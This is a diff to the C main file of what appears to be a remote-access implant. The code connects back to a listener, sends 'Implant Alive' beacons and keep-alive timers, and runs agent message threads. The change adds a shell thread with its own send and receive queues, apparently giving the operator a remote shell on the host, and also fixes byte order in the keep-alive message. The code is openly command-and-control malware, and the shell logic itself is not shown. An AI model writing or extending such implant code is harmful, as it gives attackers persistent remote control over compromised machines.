@@ -14,7 +14,8 @@
 #include "implant.h"
 #include "queue.h"
 #include "agent_comms.h"
-#include "agent_message_handler.h"
+#include "agent_handler.h"
+#include "shell.h"
 
 #define ALIVE_FREQUENCY	10
 
@@ -25,6 +26,12 @@ pthread_mutex_t agent_receive_queue_lock;
 // Send Queue
 Queue* agent_send_queue;
 pthread_mutex_t agent_send_queue_lock;
+// Shell Receive Queue
+Queue* shell_receive_queue;
+pthread_mutex_t shell_receive_queue_lock;
+// Shell Send Queue
+Queue* shell_send_queue;
+pthread_mutex_t shell_send_queue_lock;
 // Start time
 time_t start_time;
 // Alarm flag
@@ -48,14 +55,14 @@ void *keep_alive(void *vargp){
 			fragment = malloc(sizeof(Fragment));
 			memset(fragment, 0, sizeof(Fragment));
 			// set first 4 bytes of message to message size (4 bytes)
-			fragment->first_payload.total_size = sizeof(fragment->first_payload.alive_time);
+			fragment->first_payload.total_size = htonl(sizeof(fragment->first_payload.alive_time));
 			fragment->first_payload.alive_time = htonl(time(NULL) - start_time);
 			
 			message = malloc(sizeof(Queue_Message));
 			memset(message, 0, sizeof(Queue_Message));
 			
 			// size = type (4 bytes) + index (4 bytes) + payload size (4 bytes) + alive time (4 bytes)
-			message->fragment_size = sizeof(fragment->type) + sizeof(fragment->index) + sizeof(fragment->first_payload.total_size) + sizeof(fragment->first_payload.alive_time);
+			message->size = sizeof(fragment->type) + sizeof(fragment->index) + sizeof(fragment->first_payload.total_size) + sizeof(fragment->first_payload.alive_time);
 			message->fragment = fragment;
 			
 			enqueue(agent_send_queue, &agent_send_queue_lock, message);
@@ -73,7 +80,7 @@ int connect_to_listener(char* ip_addr, int port){
     char* buffer;
     char* message = "Implant Alive\n";
     struct sockaddr_in addr;
-    pthread_t agent_receive_tid, agent_send_tid, agent_message_handler_tid, keep_alive_tid;
+    pthread_t agent_receive_tid, agent_send_tid, agent_message_handler_tid, keep_alive_tid, shell_tid;
 
     if (ip_addr == NULL || !port){
         printf("Bad IP or port\n");
@@ -106,6 +113,8 @@ int connect_to_listener(char* ip_addr, int port){
     pthread_create(&agent_message_handler_tid, NULL, agent_handle_message, &sockfd);
     // Start keep alive thread
     pthread_create(&keep_alive_tid, NULL, keep_alive, NULL);
+    // Start shell thread
+    pthread_create(&shell_tid, NULL, shell_thread, NULL);
     
     agent_alive_flag = true;
     
@@ -113,6 +122,7 @@ int connect_to_listener(char* ip_addr, int port){
     pthread_join(agent_send_tid, NULL);
     pthread_join(agent_message_handler_tid, NULL);
     pthread_join(keep_alive_tid, NULL);
+    pthread_join(shell_tid, NULL);
 
     close(sockfd);
     return RET_OK;;
@@ -131,6 +141,12 @@ int main(int argc, char** argv){
     // Create send queue
     agent_send_queue = createQueue(QUEUE_SIZE);
     pthread_mutex_init(&agent_send_queue_lock, NULL);
+    // Create shell receive queue
+    shell_receive_queue = createQueue(QUEUE_SIZE);
+    pthread_mutex_init(&shell_receive_queue_lock, NULL);
+    // Create shell send queue
+    shell_send_queue = createQueue(QUEUE_SIZE);
+    pthread_mutex_init(&shell_send_queue_lock, NULL);
     
     connect_to_listener(ip_addr, port);
     return RET_OK;;
